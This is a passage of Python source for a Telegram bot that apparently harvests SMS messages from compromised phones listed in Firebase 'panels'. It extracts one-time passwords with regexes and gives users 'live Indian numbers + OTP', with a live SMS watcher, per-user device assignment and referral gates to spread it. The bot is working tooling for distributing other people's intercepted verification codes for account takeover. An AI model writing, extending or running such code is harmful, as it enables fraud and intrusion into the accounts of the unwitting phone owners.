                r'\b(\d{4,8})\b\D{0,20}(?:OTP|code|verification|verify|login)\b',
                r'#(\d{4,8})\b'):
        m = re.search(pat, text, re.IGNORECASE)
        if m and m.group(1).isdigit():
            return m.group(1)
    if re.search(r"otp|password|code|pin", text, re.IGNORECASE):
        m = re.search(r"\b(\d{4,8})\b", text)
        if m:
            return m.group(1)
    return ""

_DT_FMTS = ("%d-%m-%Y | %I:%M %p", "%d-%m-%Y %I:%M %p", "%Y-%m-%d %H:%M:%S",
            "%d/%m/%Y %H:%M:%S")

def msg_epoch(m, key):
    for k in ("time", "timestamp", "date", "dateTime", "receivedTime", "received_at", "sentTime", "createdAt"):
        v = m.get(k)
        if v is None:
            continue
        s = str(v).strip()
        if re.fullmatch(r"\d{10,15}", s):
            n = int(s)
            if n > 10**12: n //= 1000
            if n > 10**9:
                return n
        for f in _DT_FMTS:
            try:
                return int(datetime.strptime(s, f).replace(tzinfo=IST).timestamp())
            except ValueError:
                pass
    s = str(key)
    if re.fullmatch(r"\d{10,15}", s):
        n = int(s)
        if n > 10**12: n //= 1000
        if n > 10**9:
            return n
    return 0

def fmt_ist(epoch):
    if not epoch:
        return "—"
    return datetime.fromtimestamp(epoch, IST).strftime("%d-%m %H:%M:%S") + " IST"

def msg_time_str(m, key):
    for k in ("time", "timestamp", "date", "dateTime", "receivedTime", "received_at", "sentTime", "createdAt"):
        v = m.get(k)
        if v is not None and str(v).strip():
            s = str(v).strip()
            if re.fullmatch(r"\d{10,15}", s):
                n = int(s)
                if n > 10**12: n //= 1000
                if n > 10**9:
                    return datetime.fromtimestamp(n, IST).strftime("%d-%m %H:%M:%S") + " IST"
                return s[:40]
            return s[:40]
    return fmt_ist(msg_epoch(m, key))

def fmt_phone(p):
    return f"+91 {p[:5]} {p[5:]}"

def learn_ts(url, cid, msgs):
    if msgs:
        e = msg_epoch(msgs[0][1], msgs[0][0])
        if e:
            learned_ts[(url, str(cid))] = max(learned_ts.get((url, str(cid)), 0), e)

_PHONE_PAT = re.compile(r'(?:\+91|91|0)?([6-9]\d{9})')

def extract_phone_from_msgs(msgs):
    from collections import Counter
    counts = Counter()
    for k, m in msgs:
        if not isinstance(m, dict):
            continue
        for num in _PHONE_PAT.findall(msg_body(m)):
            d = re.sub(r"\D", "", num)
            if len(d) == 10 and d[0] in "6789":
                counts[d] += 1
    return counts.most_common(1)[0][0] if counts else ""

def dev_status(d):
    return "ᴀᴄᴛɪᴠᴇ" if d["online"] else "ɪᴅʟᴇ"

def sms_line(m, key):
    body = msg_body(m)
    sender = msg_sender(m)[:16]
    otp = msg_otp(body)
    t = msg_time_str(m, key)
    if otp:
        return f"[{esc(sender)}] ▪ ᴏᴛᴘ: <code>{esc(otp)}</code>\nᴛɪᴍᴇ: {esc(t)}"
    return f"[{esc(sender)}] {esc(body[:70])}\nᴛɪᴍᴇ: {esc(t)}"

def sms_block(m, key):
    body = msg_body(m)
    sender = msg_sender(m)[:20]
    otp = msg_otp(body)
    t = msg_time_str(m, key)
    head = f"[{esc(sender)}]" + (f" ▪ ᴏᴛᴘ: <code>{esc(otp)}</code>" if otp else "")
    return (f"▪ <b>{head}</b>\n"
            f"<blockquote>{esc(body) if body else '—'}</blockquote>\n"
            f"ᴛɪᴍᴇ: {esc(t)}")

def dev_card(d, title="ʏᴏᴜʀ ɴᴜᴍʙᴇʀ"):
    msgs = fetch_msgs(d["url"], d["cid"], 3)
    learn_ts(d["url"], d["cid"], msgs)
    last = sms_line(msgs[0][1], msgs[0][0]) if msgs else "ɴᴏ ꜱᴍꜱ ʏᴇᴛ"
    dot = "🟢" if d["online"] else "🔴"
    txt = (f"{sec('📞', title)}\n{DIV}\n\n"
           f"<blockquote>{emo('📞')} <b>ɴᴜᴍʙᴇʀ:</b> <code>{fmt_phone(d['phone'])}</code>\n"
           f"{dot} <b>ꜱᴛᴀᴛᴜꜱ:</b> {dev_status(d)}\n"
           f"{emo('📱')} <b>ᴅᴇᴠɪᴄᴇ:</b> {esc(d['name'][:20])}\n\n"
           f"▪ <b>ʟᴀꜱᴛ ꜱᴍꜱ</b>\n{last}</blockquote>" + footer())
    kb = buttons([
        [btn("ɴᴇᴡ ɴᴜᴍʙᴇʀ", "dev_new", style="success", icon=EID["phone"]),
         btn("ʀᴇꜰʀᴇsʜ", "dev_refresh", style="primary", icon=EID["ok"])],
        [btn("sᴍs ʜɪsᴛᴏʀʏ", "dev_hist", style="primary", icon=EID["doc"]),
         btn("ᴡᴀᴛᴄʜ sᴍs ʟɪᴠᴇ", "dev_live", style="success", icon=EID["fire"])],
        [b_back()]])
    return txt, kb

def stop_live(uid):
    st = state.get(uid)
    if st:
        st["live_stop"] = True

def live_watcher(cid, uid):
    st = state.get(uid) or {}
    d = st.get("dev")
    if not d:
        return
    st["live_stop"] = False
    m = send(cid, f"{sec('🔴', 'ʟɪᴠᴇ sᴍs — ' + fmt_phone(d['phone']))}\n{DIV}\n\n"
                  f"{emo('⚡', 'bolt')} ᴄᴏɴɴᴇᴄᴛɪɴɢ ᴛᴏ ᴅᴇᴠɪᴄᴇ...")
    if not (m and m.get("ok")):
        return
    mid = m["result"]["message_id"]
    top_key = None
    last_txt = None
    end = time.time() + LIVE_SECS
    kb = buttons([[btn("sᴛᴏᴘ", "live_stop", style="danger", icon=EID["warn"])], [b_back()]])
    while time.time() < end:
        if st.get("live_stop"):
            return
        try:
            msgs = fetch_msgs(d["url"], d["cid"], 3)
            learn_ts(d["url"], d["cid"], msgs)
            if msgs and msgs[0][0] != top_key:
                top_key = msgs[0][0]
                lines = "\n\n".join(sms_block(x[1], x[0]) for x in msgs[:3])
                txt = f"{sec('🔴', 'ʟɪᴠᴇ sᴍs — ' + fmt_phone(d['phone']))}\n{DIV}\n\n{lines}{footer()}"
            elif not msgs:
                txt = (f"{sec('🔴', 'ʟɪᴠᴇ sᴍs — ' + fmt_phone(d['phone']))}\n{DIV}\n\n"
                       f"ᴡᴀɪᴛɪɴɢ ꜰᴏʀ ɴᴇᴡ ꜱᴍs...{footer()}")
            else:
                txt = None
            if txt and txt != last_txt:
                last_txt = txt
                edit(cid, mid, txt, kb)
        except Exception:
            log.exception("live watcher")
        time.sleep(2.5)
    edit(cid, mid, f"{sec('🔴', 'ʟɪᴠᴇ ᴇɴᴅᴇᴅ — ' + fmt_phone(d['phone']))}\n{DIV}\n\n"
                   f"{emo('⚡', 'bolt')} ᴡᴀᴛᴄʜ ꜱᴇssɪᴏɴ ꜰɪɴɪsʜᴇᴅ.{footer()}",
         buttons([[btn("ʀᴇꜱᴛᴀʀᴛ ʟɪᴠᴇ", "dev_live", style="success", icon=EID["fire"])], [b_back()]]))

# ── force join (OFF for now) ──
_fj = {}
_fj_lock = threading.Lock()

def ch_url(ch):
    if ch.get("url"):
        return ch["url"]
    r = api("getChat", chat_id=ch["id"])
    if r and r.get("ok"):
        un = (r["result"].get("username") or "").strip()
        if un:
            return f"https://t.me/{un}"
    r = api("createChatInviteLink", chat_id=ch["id"])
    if r and r.get("ok"):
        return r["result"].get("invite_link", "https://t.me/HATHI03")
    return "https://t.me/HATHI03"

def force_check(uid):
    try:
        uid = int(uid)
    except (TypeError, ValueError):
        pass
    missing = []
    for ch in FORCE_CHANNELS:
        r = api("getChatMember", chat_id=ch["id"], user_id=uid)
        if not (r and r.get("ok") and r["result"].get("status") in ("member", "administrator", "creator")):
            missing.append(ch["label"])
    return missing

def force_ok(uid):
    if not FORCE_JOIN_ENABLED or is_adm(uid) or is_unlimited(uid):
        return True
    with _fj_lock:
        hit = _fj.get(uid)
    if hit and time.time() - hit[0] < 300:
        return hit[1]
    ok = not force_check(uid)
    with _fj_lock:
        _fj[uid] = (time.time(), ok)
    return ok

def force_card(cid, u):
    rows = []
    for ch in FORCE_CHANNELS:
        rows.append([btn(ch["label"], None, url=ch_url(ch), style="primary", icon=EID["link"])])
    rows.append([btn("ᴠᴇʀɪꜰʏ", "verify", style="success", icon=EID["ok"])])
    send_video(cid, f"{sec('🔐', 'ᴊᴏɪɴ ᴛᴏ ᴜꜱᴇ ʙᴏᴛ')}\n{DIV}\n\n"
                    f"<blockquote>{emo('👋')} ʜᴇʏ <b>{esc(u.get('first_name') or 'ᴜꜱᴇʀ')}</b>!\n"
                    f"{emo('📢')} ᴛᴏ ᴜꜱᴇ ᴛʜɪs ʙᴏᴛ, ᴊᴏɪɴ ᴀʟʟ ᴄʜᴀɴɴᴇʟs ʙᴇʟᴏᴡ,\n"
                    f"ᴛʜᴇɴ ᴛᴀᴘ <b>ᴠᴇʀɪꜰʏ</b>.</blockquote>" + footer(),
               buttons(rows))

# ── referral lock ──
def unlocked(uid):
    if is_adm(uid) or is_unlimited(uid):
        return True
    try:
        return len(get_user(uid).get("refs", [])) >= MIN_REFS
    except Exception:
        return False

def send_home_gated(cid, u):
    if unlocked(str(u["id"])):
        send_home(cid, u["id"], u)
    else:
        reflock_card(cid, u)

def reflock_card(cid, u):
    uid = str(u["id"])
    d = get_user(u["id"], u.get("username"), u.get("first_name"))
    have = len(d.get("refs", []))
    need = max(0, MIN_REFS - have)
    link = f"https://t.me/{BOT_UN}?start=ref_{uid}"
    bar = "🔹" * min(have, MIN_REFS) + "▫️" * need
    send_video(cid, f"{sec('🔒', 'ʀᴇꜰᴇʀ ᴛᴏ ᴜɴʟᴏᴄᴋ')}\n{DIV}\n\n"
                    f"<blockquote>{emo('👋')} ʜᴇʏ <b>{esc(u.get('first_name') or 'ᴜꜱᴇʀ')}</b>!\n"
                    f"{emo('🔒')} ᴀʟʟ ꜰᴇᴀᴛᴜʀᴇs ᴀʀᴇ ʟᴏᴄᴋᴇᴅ ᴛɪʟʟ ʏᴏᴜ ɪɴᴠɪᴛᴇ\n"
                    f"<b>{MIN_REFS} ꜰʀɪᴇɴᴅs</b> ᴠɪᴀ ʏᴏᴜʀ ʟɪɴᴋ. ꜱʜᴀʀᴇ ᴀɴᴅ ᴜɴʟᴏᴄᴋ!</blockquote>\n\n"
                    f"{emo('🤝', 'hand')} <b>ᴘʀᴏɢʀᴇss:</b> {have}/{MIN_REFS}  {bar}\n"
                    f"{emo('🔗', 'link')} <b>ʏᴏᴜʀ ʟɪɴᴋ:</b>\n<code>{link}</code>" + footer(),
               buttons([
                   [btn("ꜱʜᴀʀᴇ ʟɪɴᴋ", None, url=f"https://t.me/share/url?url={quote(link, safe='')}",
                        style="success", icon=EID["rocket"])],
                   [btn("ᴄʜᴇᴄᴋ ᴀɢᴀɪɴ", "refcheck", style="primary", icon=EID["ok"])]]))

# ── number occupancy (each user gets a different device) ──
NUMS_FILE = DATA / "nums.json"
OCCUPY_SECS = 900
_nlock = threading.RLock()
num_assign = {}  # "url|cid" -> {"uid", "ts", "phone"}

def _load_nums():
    global num_assign
    if NUMS_FILE.exists():
        try:
            num_assign = json.loads(NUMS_FILE.read_text(encoding="utf-8"))
        except Exception:
            num_assign = {}
    now = time.time()
    num_assign = {k: v for k, v in num_assign.items() if now - v.get("ts", 0) <= OCCUPY_SECS}

def _save_nums():
    with _nlock:
        try:
            NUMS_FILE.write_text(json.dumps(num_assign), encoding="utf-8")
        except Exception:
            pass

def release_user_nums(uid):
    uid = str(uid)
    with _nlock:
        dead = [k for k, v in num_assign.items() if v.get("uid") == uid]
        for k in dead:
            del num_assign[k]
    if dead:
        threading.Thread(target=_save_nums, daemon=True).start()

def claim_device(uid, d):
    uid = str(uid)
    release_user_nums(uid)
    with _nlock:
        num_assign[f"{d['url']}|{d['cid']}"] = {"uid": uid, "ts": time.time(),
                                                "phone": d.get("phone", "")}
    threading.Thread(target=_save_nums, daemon=True).start()

def is_taken(d, uid):
    uid = str(uid)
    now = time.time()
    with _nlock:
        for k, v in num_assign.items():
            if v.get("uid") == uid or now - v.get("ts", 0) > OCCUPY_SECS:
                continue
            if k == f"{d['url']}|{d['cid']}" or (v.get("phone") and v.get("phone") == d.get("phone")):
                return True, v.get("ts", 0)
    return False, 0

# ── cards ──
def welcome_text(uid, u):
    d = get_user(uid, u.get("username"), u.get("first_name"))
    un = f"@{u.get('username')}" if u.get("username") else "—"
    return (f"{sec('🔥', 'ᴡᴇʟᴄᴏᴍᴇ')}\n{DIV}\n\n"
            f"{emo('👤', 'user')} <b>ɴᴀᴍᴇ:</b> {esc(u.get('first_name') or '—')}\n"
            f"{emo('🔗', 'link')} <b>ᴜsᴇʀɴᴀᴍᴇ:</b> {esc(un)}\n"
            f"{emo('🆔')} <b>ɪᴅ:</b> <code>{uid}</code>\n"
            f"{emo('🤝', 'hand')} <b>ʀᴇꜰᴇʀs:</b> {len(d.get('refs', []))}\n\n"
            f"<blockquote>{emo('📱')} ʟɪᴠᴇ ɪɴᴅɪᴀɴ ɴᴜᴍʙᴇʀs + ᴏᴛᴘ\n"
            f"{emo('⚡', 'bolt')} ꜰʀᴇᴇ ꜰᴏʀ ᴀʟʟ — ɴᴏ ᴄʀᴇᴅɪᴛs ɴᴇᴇᴅᴇᴅ\n"
            f"{emo('👉')} ᴄʜᴏᴏꜱᴇ ᴀɴ ᴏᴘᴛɪᴏɴ ʙᴇʟᴏᴡ</blockquote>")

def home_kb(uid):
    rows = [
        [btn("ꜰɪɴᴅ ɴᴜᴍʙᴇʀ", "getnum", style="primary", icon=EID["phone"]),
         btn("ꜱᴇᴀʀᴄʜ ɴᴜᴍʙᴇʀ", "search", style="primary", icon=EID["search"])],
        [btn("ᴀᴄᴛɪᴠᴇ ɴᴜᴍʙᴇʀꜱ", "act", style="primary", icon=EID["chart"]),
         btn("ʟᴇᴀᴅᴇʀʙᴏᴀʀᴅ", "lb", style="primary", icon=EID["crown"])],
        [btn("ʀᴇꜰᴇʀ ᴀɴᴅ ᴇᴀʀɴ", "refer", style="success", icon=EID["hand"]),
         btn("ᴀᴅᴅ ꜰɪʀᴇʙᴀꜱᴇ", "addfb", style="success", icon=EID["plus"])],
        [btn("ʜᴇʟᴘ", "help", style="primary", icon=EID["info"])],
    ]
    if is_adm(uid):
        rows.append([btn("ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ", "adm", style="danger", icon=EID["gear"])])
    return buttons(rows)

def send_home(cid, uid, u):
    send_video(cid, welcome_text(uid, u), home_kb(uid))

def get_number(cid, uid, mid=None):
    ensure_user_fbs(uid)
    idx = devices_index(uid)
    online = [d for d in idx if d["online"]]
    if not online:
        txt = (f"{sec('👻', 'ɴᴏ ᴅᴇᴠɪᴄᴇꜱ ᴏɴʟɪɴᴇ')}\n{DIV}\n\n"
               f"ᴛʀʏ ᴀɢᴀɪɴ ɪɴ ᴀ ᴍɪɴᴜᴛᴇ." + footer())
        kb = buttons([[btn("ʀᴇᴛʀʏ", "getnum", style="primary", icon=EID["ok"])], [b_back()]])
        if mid: edit(cid, mid, txt, kb)
        else:   send(cid, txt, kb)
        return
    withphone = [d for d in online if d["phone"]]
    if not withphone:
        def resolve(d):
            msgs = fetch_msgs(d["url"], d["cid"], 5)
            learn_ts(d["url"], d["cid"], msgs)
            p = extract_phone_from_msgs(msgs)
            if p:
                d["phone"] = p
                return d
            return None
        pool = random.sample(online, min(12, len(online)))
        withphone = [d for d in JOB_POOL.map(resolve, pool) if d]
    if not withphone:
        txt = (f"{sec('👻', 'ɴᴏ ɴᴜᴍʙᴇʀꜱ ᴀᴠᴀɪʟᴀʙʟᴇ')}\n{DIV}\n\n"
               f"ᴛʀʏ ᴀɢᴀɪɴ ɪɴ ᴀ ᴍɪɴᴜᴛᴇ." + footer())
        kb = buttons([[btn("ʀᴇᴛʀʏ", "getnum", style="primary", icon=EID["ok"])], [b_back()]])
        if mid: edit(cid, mid, txt, kb)
        else:   send(cid, txt, kb)
        return
    random.shuffle(withphone)
    def best(d):
        msgs = fetch_msgs(d["url"], d["cid"], 1)
        learn_ts(d["url"], d["cid"], msgs)
        return (msg_epoch(msgs[0][1], msgs[0][0]) if msgs else 0, d)
    scored = list(JOB_POOL.map(best, withphone[:36]))
    scored.sort(key=lambda x: -x[0])
    pick = None
    fallback = None
    for ep, d in scored:
        taken, ts = is_taken(d, uid)
        if not taken:
            pick = d
            break
        if fallback is None or ts < fallback[0]:
            fallback = (ts, d)
    if pick is None:
        pick = fallback[1] if fallback else (scored[0][1] if scored else None)
    if pick is None:
        txt = (f"{sec('👻', 'ɴᴏ ɴᴜᴍʙᴇʀꜱ ᴀᴠᴀɪʟᴀʙʟᴇ')}\n{DIV}\n\n"
               f"ᴛʀʏ ᴀɢᴀɪɴ ɪɴ ᴀ ᴍɪɴᴜᴛᴇ." + footer())
        kb = buttons([[btn("ʀᴇᴛʀʏ", "getnum", style="primary", icon=EID["ok"])], [b_back()]])
        if mid: edit(cid, mid, txt, kb)
        else:   send(cid, txt, kb)
        return
    claim_device(uid, pick)
    state.setdefault(str(uid), {})["dev"] = pick
    txt, kb = dev_card(pick)
    if mid: edit(cid, mid, txt, kb)
    else:   send(cid, txt, kb)

# ── active numbers ──
def sorted_devices(uid):
    idx = devices_index(uid)
    idx.sort(key=lambda d: (0 if d["online"] else 1,
                            -learned_ts.get((d["url"], d["cid"]), 0), d["phone"]))
    return idx

def active_card(uid, page):
    snap = page_cache.get(uid)
    now = time.time()
    if not snap or now - snap["t"] > 180:
        devs = sorted_devices(uid)
        snap = {"list": devs, "t": now}
        if len(page_cache) > 400:
            page_cache.clear()
        page_cache[uid] = snap
    lst = snap["list"]
    total = len(lst)
    hot = sum(1 for d in lst if d["online"])
    pages = max(1, (total + PAGE_SIZE - 1) // PAGE_SIZE)
    page = max(0, min(page, pages - 1))
    chunk = lst[page * PAGE_SIZE:(page + 1) * PAGE_SIZE]
    lines = []
    for i, d in enumerate(chunk, page * PAGE_SIZE + 1):
        dot = "🟢" if d["online"] else "🔴"
        lines.append(f"{dot} {i}. <code>{fmt_phone(d['phone'])}</code>")
    body = "\n".join(lines) if lines else "ᴇᴍᴘᴛʏ — ɴᴏ ᴅᴇᴠɪᴄᴇs ꜰᴏᴜɴᴅ."
    txt = (f"{sec('🟢', 'ᴀᴄᴛɪᴠᴇ ɴᴜᴍʙᴇʀꜱ')}\n{DIV}\n\n"
           f"ᴛᴏᴛᴀʟ: <b>{total}</b>  ·  ʜᴏᴛ: <b>{hot}</b>  ·  ᴘᴀɢᴇ {page + 1}/{pages}\n\n"
           f"{body}" + footer())
    num_rows = []
    row = []
    for i, d in enumerate(chunk):
        row.append(btn(d["phone"][-4:], f"num_{page * PAGE_SIZE + i}",
                       style="success" if d["online"] else "danger",
                       icon=EID["phone"] if d["online"] else EID["warn"]))
        if len(row) == 2:
            num_rows.append(row)
            row = []
    if row:
        num_rows.append(row)
    nav = []
    if page > 0:
        nav.append(btn("◀️", f"act_{page - 1}", style="primary"))
    nav.append(btn(f"📄 {page + 1}/{pages}", "noop", style="primary"))
    if page < pages - 1:
        nav.append(btn("▶️", f"act_{page + 1}", style="primary"))
    num_rows.append(nav)
    num_rows.append([btn("ʀᴇꜰʀᴇsʜ", "act_refresh", style="success", icon=EID["ok"]), b_back()])
    return txt, buttons(num_rows)

# ── leaderboard / refer ──
def lb_card(uid):
    with _lock:
        ranked = [(k, v) for k, v in sorted(users.items(), key=lambda kv: -len(kv[1].get("refs", [])))
                  if v.get("refs")]
    lines = []
    medals = ["🥇", "🥈", "🥉"]
    for i, (k, v) in enumerate(ranked[:10]):
        name = esc(v.get("n") or "—")
        un = f"@{esc(v['u'])}" if v.get("u") else ""
        cnt = len(v.get("refs", []))
        if i == 0:
            lines.append(f"{emo('👑', 'crown')} <b>{name}</b> {un} — {cnt} ʀᴇꜰᴇʀs")
        else:
            m = medals[i] if i < 3 else f"▪ {i + 1}."
            lines.append(f"{m} {name} {un} — {cnt} ʀᴇꜰᴇʀs")
    body = "\n".join(lines) if lines else "ɴᴏ ʀᴇꜰᴇʀs ʏᴇᴛ — ʙᴇ ᴛʜᴇ ꜰɪʀsᴛ!"
    my_idx = next((i + 1 for i, (k, _) in enumerate(ranked) if k == str(uid)), None)
    me = get_user(uid)
    my_line = (f"#{my_idx}" if my_idx else "—") + f" · {len(me.get('refs', []))} ʀᴇꜰᴇʀs"
    txt = (f"{sec('👑', 'ʟᴇᴀᴅᴇʀʙᴏᴀʀᴅ')}\n{DIV}\n\n"
           f"{body}\n\n"
           f"{emo('🤝', 'hand')} <b>ʏᴏᴜʀ ʀᴀɴᴋ:</b> {my_line}" + footer())
    kb = buttons([[btn("ʀᴇꜰᴇʀ ᴀɴᴅ ᴇᴀʀɴ", "refer", style="success", icon=EID["hand"])], [b_back()]])
    return txt, kb

def refer_card(uid):
    d = get_user(uid)
    link = f"https://t.me/{BOT_UN}?start=ref_{uid}"
    txt = (f"{sec('🤝', 'ʀᴇꜰᴇʀ ᴀɴᴅ ᴇᴀʀɴ')}\n{DIV}\n\n"
           f"<blockquote>{emo('🚀', 'rocket')} ꜱʜᴀʀᴇ ʏᴏᴜʀ ʟɪɴᴋ ᴀɴᴅ ᴄʟɪᴍʙ ᴛʜᴇ\n"
           f"{emo('👑', 'crown')} <b>ʟᴇᴀᴅᴇʀʙᴏᴀʀᴅ</b>!\n"
           f"{emo('💎')} ʙᴏᴛ ɪs ꜰʀᴇᴇ — ʀᴇꜰᴇʀs ᴄᴏᴜɴᴛ ꜰᴏʀ ꜰᴀᴍᴇ ᴏɴʟʏ.</blockquote>\n\n"
           f"{emo('🔗', 'link')} <b>ʏᴏᴜʀ ʟɪɴᴋ:</b>\n<code>{link}</code>\n\n"
           f"{emo('👤', 'user')} <b>ʏᴏᴜʀ ʀᴇꜰᴇʀs:</b> {len(d.get('refs', []))}" + footer())
    kb = buttons([
        [btn("sʜᴀʀᴇ ʟɪɴᴋ", None, url=f"https://t.me/share/url?url={quote(link, safe='')}",
             style="success", icon=EID["rocket"])],
        [btn("ʟᴇᴀᴅᴇʀʙᴏᴀʀᴅ", "lb", style="primary", icon=EID["crown"]), b_back()]])
    return txt, kb

# ── add firebase ──
FB_RE = re.compile(r"^https://[a-z0-9][a-z0-9-]*(-[a-z0-9]+)*(-default-rtdb)?\.(firebaseio\.com|firebasedatabase\.app)/?$")

def addfb_notify(cid_admin, uid, d, url):
    try:
        r = api("getUserProfilePhotos", user_id=uid, limit=1)
        fid = None
        if r and r.get("ok") and r["result"].get("total_count", 0) > 0:
            fid = r["result"]["photos"][0][-1]["file_id"]
    except Exception:
        fid = None
    cap = (f"{sec('💎', 'ɴᴇᴡ ꜰɪʀᴇʙᴀꜱᴇ ᴀᴅᴅᴇᴅ')}\n{DIV}\n\n"
           f"{emo('👤', 'user')} <b>ᴜsᴇʀ:</b> {esc(d.get('n') or '—')}\n"
           f"{emo('🔗', 'link')} <b>ᴜsᴇʀɴᴀᴍᴇ:</b> {'@' + esc(d['u']) if d.get('u') else '—'}\n"
           f"{emo('🆔')} <b>ɪᴅ:</b> <code>{uid}</code>\n"
           f"{emo('📌')} <b>ᴜʀʟ:</b> <code>{esc(url)}</code>\n"
           f"{emo('📅')} <b>ᴛɪᴍᴇ:</b> {esc(datetime.now(IST).strftime('%d-%m-%Y %I:%M:%S %p'))}")
    if fid:
        api("sendPhoto", chat_id=cid_admin, photo=fid, caption=cap, parse_mode="HTML")
    else:
        send(cid_admin, cap)

def help_card(cid):
    txt = (f"{sec('❓', 'ʜᴇʟᴘ')}\n{DIV}\n\n"
           f"{emo('📞')} <b>ꜰɪɴᴅ ɴᴜᴍʙᴇʀ</b> — ʟᴀᴛᴇsᴛ ᴏɴʟɪɴᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ɪᴛs ʟᴀꜱᴛ ᴏᴛᴘ.\n"
           f"{emo('🔍')} <b>ꜱᴇᴀʀᴄʜ ɴᴜᴍʙᴇʀ</b> — ꜱᴇɴᴅ ᴀ 10-ᴅɪɢɪᴛ ɴᴜᴍʙᴇʀ, ɪ ꜰɪɴᴅ ɪᴛ ɪɴ ᴀʟʟ ᴘᴀɴᴇʟs.\n"
           f"{emo('🟢')} <b>ᴀᴄᴛɪᴠᴇ ɴᴜᴍʙᴇʀꜱ</b> — ᴀʟʟ ɴᴜᴍʙᴇʀꜱ, ᴏɴʟɪɴᴇ ꜰɪʀsᴛ, ᴘᴀɢᴇᴅ.\n"
           f"{emo('👑', 'crown')} <b>ʟᴇᴀᴅᴇʀʙᴏᴀʀᴅ</b> — ᴛᴏᴘ ʀᴇꜰᴇʀʀᴇʀs.\n"
           f"{emo('🤝', 'hand')} <b>ʀᴇꜰᴇʀ ᴀɴᴅ ᴇᴀʀɴ</b> — ʏᴏᴜʀ ɪɴᴠɪᴛᴇ ʟɪɴᴋ.\n"
           f"{emo('➕')} <b>ᴀᴅᴅ ꜰɪʀᴇʙᴀꜱᴇ</b> — ᴀᴅᴅ ʏᴏᴜʀ ᴏᴡɴ ᴘᴀɴᴇʟ (ᴘʀɪᴠᴀᴛᴇ, ᴏɴʟʏ ʏᴏᴜ ꜱᴇᴇ ɪᴛ)." + footer())
    send(cid, txt, buttons([[b_back()]]))

# ── admin ──
def admin_menu(cid):
    with _lock:
        total = len(users)
        banned = sum(1 for v in users.values() if v.get("banned"))
        refs = sum(len(v.get("refs", [])) for v in users.values())
        fbu = sum(len(v.get("fbs", [])) for v in users.values())
        admc = len(ADMIN_IDS) + len(extra_admins)
    with fb_lock:
        okfb = sum(1 for v in fb_cache.values() if v["ok"])
        devs = sum(len(v["clients"]) for v in fb_cache.values() if v["ok"])
    with fb_list_lock:
        g = len(GLOBAL_FB_LIST)
    hot = sum(1 for d in devices_index("") if d["online"])
    send(cid, f"{sec('🛠️', 'ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ')}\n{DIV}\n\n"
              f"<blockquote>{emo('👤', 'user')} <b>ᴛᴏᴛᴀʟ ᴜsᴇʀs:</b> {total}\n"
              f"{emo('🆔')} <b>ᴀᴅᴍɪɴs:</b> {admc}\n"
              f"{emo('🚫')} <b>ʙᴀɴɴᴇᴅ:</b> {banned}\n"
              f"{emo('⏳')} <b>ᴜᴘᴛɪᴍᴇ:</b> {fmt_uptime()}\n"
              f"{emo('📱')} <b>ꜰʙ ᴅᴇᴠɪᴄᴇs:</b> {devs}\n"
              f"{emo('🟢')} <b>ᴏɴʟɪɴᴇ:</b> {hot}\n"
              f"{emo('🔗', 'link')} <b>ᴘᴀɴᴇʟs:</b> {g} ({okfb} ᴏᴋ) + {fbu} ᴜsᴇʀ\n"
              f"{emo('🤝', 'hand')} <b>ʀᴇꜰᴇʀs:</b> {refs}</blockquote>\n\n"
              f"{emo('👉')} ꜱᴇʟᴇᴄᴛ:",
         buttons([
             [btn("ᴀᴅᴅ ᴀᴅᴍɪɴ", "adm_addadm", style="success", icon=EID["plus"]),
              btn("ʀᴇᴍᴏᴠᴇ ᴀᴅᴍɪɴ", "adm_rmadm", style="danger", icon=EID["trash"])],
             [btn("ʙᴀɴ ᴜsᴇʀ", "adm_ban", style="danger", icon=EID["warn"]),
              btn("ᴜɴʙᴀɴ ᴜsᴇʀ", "adm_unban", style="success", icon=EID["ok"])],
             [btn("ʙʀᴏᴀᴅᴄᴀsᴛ", "adm_bcast", style="primary", icon=EID["mega"]),
              btn("ʙᴄ ᴛᴏ ᴜsᴇʀ", "adm_bcu", style="primary", icon=EID["user"])],
             [btn("ᴜsᴇʀ ɪɴꜰᴏ", "adm_user", style="primary", icon=EID["id"]),
              btn("ʟɪsᴛ ᴘᴀɴᴇʟs", "adm_fbs", style="primary", icon=EID["link"])],
             [btn("ᴀᴅᴅ ꜰʙ", "adm_addfb", style="primary", icon=EID["plus"]),
              btn("ᴀᴅᴅ/ʀᴇᴍᴏᴠᴇ ᴠɪᴅᴇᴏ", "adm_video", style="primary", icon=EID["doc"])],
             [btn("ʀᴇꜰʀᴇsʜ", "adm", style="primary", icon=EID["ok"]),
              b_back("back")]]))

# ── routing ──
def count_ref(u, rid):
    uid = str(u["id"])
    with _lock:
        d = users.get(uid)
        rd = users.get(rid)
        if d is None or rd is None or uid in rd.get("refs", []):
            return
        rd.setdefault("refs", []).append(uid)
        save()
    total = len(rd["refs"])
    more = "" if total >= MIN_REFS else f" — {MIN_REFS - total} ᴍᴏʀᴇ ᴛᴏ ᴜɴʟᴏᴄᴋ"
    send(int(rid), f"{sec('🎉', 'ʏᴏᴜ ɢᴏᴛ ᴀ ʀᴇꜰᴇʀ')}\n{DIV}\n\n"
                   f"{emo('👤')} <b>{esc(d.get('n') or 'ᴜsᴇʀ')}</b> ᴊᴏɪɴᴇᴅ ᴀʟʟ ᴄʜᴀɴɴᴇʟs ᴠɪᴀ ʏᴏᴜʀ ʟɪɴᴋ!\n"
                   f"{emo('🤝')} <b>ʀᴇꜰᴇʀs:</b> {total}/{MIN_REFS}{more}" + footer())
    if total == MIN_REFS:
        send(int(rid), f"{sec('🔓', 'ʏᴏᴜ ᴀʀᴇ ᴜɴʟᴏᴄᴋᴇᴅ')}\n{DIV}\n\n"
                       f"{emo('🎉')} <b>{MIN_REFS} ʀᴇꜰᴇʀs</b> ᴅᴏɴᴇ — ᴀʟʟ ʙᴏᴛ\n"
                       f"ꜰᴇᴀᴛᴜʀᴇs ᴀʀᴇ ɴᴏᴡ ᴜɴʟᴏᴄᴋᴇᴅ. ᴇɴᴊᴏʏ!" + footer())

def register_ref(u, rid):
    uid = str(u["id"])
    if not rid.isdigit() or rid == uid:
        return
    with _lock:
        d = users.get(uid)
        rd = users.get(rid)
        if d is None or rd is None:
            return
        if d.get("ref_by") and d["ref_by"] != rid:
            send(u["id"], f"{emo('❌')} ʏᴏᴜ ᴀʀᴇ ᴀʟʀᴇᴀᴅʏ ʀᴇꜰᴇʀʀᴇᴅ ʙʏ <code>{esc(d['ref_by'])}</code> — ɴᴇᴡ ʟɪɴᴋ ᴡᴏɴ'ᴛ ᴄᴏᴜɴᴛ.")
            return
